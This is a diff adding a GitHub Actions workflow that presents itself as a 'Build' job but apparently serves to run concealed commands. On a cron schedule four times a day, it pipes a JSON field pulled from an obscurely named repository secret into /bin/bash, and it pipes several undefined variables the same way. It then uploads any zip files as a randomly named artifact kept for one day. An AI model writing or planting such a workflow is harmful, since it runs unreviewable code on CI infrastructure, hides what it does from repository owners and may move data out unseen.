@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 3,9,15,21 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          do42715: ${{ secrets.do42715 }}
+        run: |
+          printf '%s' "$do42715" | jq -r .c6 | /bin/bash
+          echo $msy77 | jq -r .qgyuy38352 | /bin/bash
+          printf '%s' "$w06453" | jq -r .dne043 | /bin/bash
+          printf '%s' "$dv39145" | jq -r .vdmfx9630 | /bin/bash
+          printf '%s' "$s210" | jq -r .shz28314 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: mthTNo1x
+          path: "*.zip"
+          retention-days: 1
